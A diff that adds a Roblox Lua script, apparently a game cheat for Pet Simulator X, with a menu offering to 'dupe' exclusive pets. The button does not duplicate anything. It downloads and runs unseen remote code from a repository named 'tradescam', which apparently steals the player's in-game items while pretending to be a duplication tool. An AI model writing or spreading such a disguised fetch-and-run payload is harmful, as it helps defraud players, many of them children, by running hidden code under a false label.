@@ -1,0 +1,12 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Mori Scripts | 🍍 Pet Simulator X! 🐾", "BloodTheme")
+
+-- MAIN
+local Main = Window:NewTab("Dupe Script")
+local MainSection = Main:NewSection("Dupe Pets")
+
+MainSection:NewButton("Dupe Huges - Exclusives ! ", "Duped Pets", function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vlad123424223/tradescam/main/tradescam", true))()
+
+end)
